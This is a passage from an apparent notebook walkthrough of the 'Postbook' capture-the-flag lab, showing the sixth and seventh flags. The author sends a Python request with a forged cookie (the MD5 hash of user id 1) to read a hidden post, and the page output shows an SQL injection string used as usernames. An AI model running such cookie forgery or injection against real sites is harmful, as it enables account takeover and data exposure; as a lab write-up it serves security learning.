#   With this amazing tool you can write and publish your own posts. It'll
#   allow you to write public and private posts. Public posts can be read by
#   anyone that signs up. Private posts can only be read by you. See it as your
#   own diary. We'll make sure that your private posts are safe with us.
# </p>
#
# <h2>Post timeline</h2>
#
# ^FLAG^...$FLAG$  <div class="post">
#     <form method="post" action="index.php?page=create.php">
#       <textarea name="body" style="width: 100%; height: 25px;" placeholder="What's on your mind?" class="inline" required></textarea>
#       <br /><br />
#       <input type="checkbox" name="private" />For my own eyes only
#       <input type="hidden" name="return" value="home" />
#       <input type="hidden" name="user_id" value="1" />
#       <input type="submit" value="Create post" style="float: right;" />
#     </form>
#   </div>
#
#   <div class="post"><a href="index.php?page=view.php&id=13"></a><br />create<br /><span style="color: #666">Author: ' or 1=1;--</span></div><div class="post"><a href="index.php?page=view.php&id=12"></a><br />7<br /><span style="color: #666">Author: ' or 1=1;--</span></div><div class="post"><a href="index.php?page=view.php&id=11"></a><br />create.php<br /><span style="color: #666">Author: ' or 1=1;--</span></div><div class="post"><a href="index.php?page=view.php&id=10"></a><br />profile.php&amp;id=c<br /><span style="color: #666">Author: ' or 1=1;--</span></div><div class="post"><a href="index.php?page=view.php&id=9"></a><br />3<br /><span style="color: #666">Author: ' or 1=1;--</span></div><div class="post"><a href="index.php?page=view.php&id=8"></a><br />1<br /><span style="color: #666">Author: ' or 1=1;--</span></div><div class="post"><a href="index.php?page=view.php&id=7"></a><br />2<br /><span style="color: #666">Author: ' or 1=1;--</span></div><div class="post"><a href="index.php?page=view.php&id=6"></a><br />1<br /><span style="color: #666">Author: ' or 1=1;--</span></div><div class="post"><a href="index.php?page=view.php&id=5"></a><br />a<br /><span style="color: #666">Author: ' or 1=1;--</span></div><div class="post"><a href="index.php?page=view.php&id=4"></a><br />admin post<br /><span style="color: #666">Author: admin</span><div style="float: right;"><a href="index.php?page=edit.php&id=4">edit</a> <a style="color: red;" href="index.php?page=delete.php&id=a87ff679a2f3e71d9181a67b7542122c">delete</a></div></div><div class="post"><a href="index.php?page=view.php&id=3">Hello everyone!</a><br />This is my first post as a user on Postbook!<br /><span style="color: #666">Author: ' or 1=1;--</span></div><div class="post"><span style="color: red;">SECRET:</span> <a href="index.php?page=view.php&id=2">Dear diary...</a><br />I am so glad that I am on Postbook. I can finally write down my thoughts and no one can see them. See you tomorrow. Yours truly, admin<br /><span style="color: #666">Author: admin</span><div style="float: right;"><a href="index.php?page=edit.php&id=2">edit</a> <a style="color: red;" href="index.php?page=delete.php&id=c81e728d9d4c2f636f067f89cc14862c">delete</a></div></div><div class="post"><a href="index.php?page=view.php&id=1">Hello world</a><br />This is the first post!<br /><span style="color: #666">Author: admin</span><div style="float: right;"><a href="index.php?page=edit.php&id=1">edit</a> <a style="color: red;" href="index.php?page=delete.php&id=c4ca4238a0b923820dcc509a6f75849b">delete</a></div></div>    </div>
#   </body>
# </html>
# ```
#
# Boom! Sixth flag found! I have been able to log-in as Admin.

# %% [markdown]
# ## 7° Flag caught!

# %% [markdown]
# The provided hint is: ```189*5```. The result is ```945```. I try to view the post related to that id.

# %%
response = session.get(url + "index.php?page=view.php&id=945", headers={"Content-Type": "application/x-www-form-urlencoded", 'User-Agent': 'Mozilla/5.0 (Linux; Android) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.109 Safari/537.36 CrKey/1.54.248666'}, cookies={"id": "c4ca4238a0b923820dcc509a6f75849b"})
print(response.text)

# %% [markdown]
# Response:
# ```html
# <html>
#   <head>
#     <title>Postbook</title>
#     <style type="text/css">
#       a {
#         color: blue;
#       }
#
#       html, body {
#         margin: 0;
#         padding: 0;
#         background: #edf0f5;
#         font-family: Helvetica, Arial, sans-serif;
#         font-size: 15pt;
#       }
#
#       input, textarea {
#         font-family: Helvetica, Arial, sans-serif;
#         font-size: 15pt;
#       }
#
#       div#top {
#         background-color: #3b5998;
#         padding: 10px;
#         color: white;
#       }
#
#       div#top a {
#         color: white;
#       }
#
#       div#container {
#         padding: 10px;
#       }
#
#       div.post {
#         background-color: white;
#         width: 500px;
#         padding: 20px;
#         margin-bottom: 10px;
#         border: 1px solid #eee;
#         border-radius: 5px;
#       }
#
#       textarea.inline {
#         border: 0;
#       }
#     </style>
#   </head>
#   <body>
#     <div id="top">
#       <h1>Postbook</h1>
#
#       <a href="index.php">Home</a>
#               <a href="index.php?page=create.php">Write a new post</a>
#         <a href="index.php?page=profile.php&id=d">My profile</a>
#         <a href="index.php?page=account.php">Settings</a>
#         <a href="index.php?page=sign_out.php">Sign out</a>
#
#     </div>
#
#     <div id="container">
#       <div class="post"><a href="index.php?page=view.php&id=">Well done!</a><br />^FLAG^...$FLAG$<br /><span style="color: #666">Author: </span></div>    </div>
#   </body>
# </html>
# ```
#
# Last flag found!
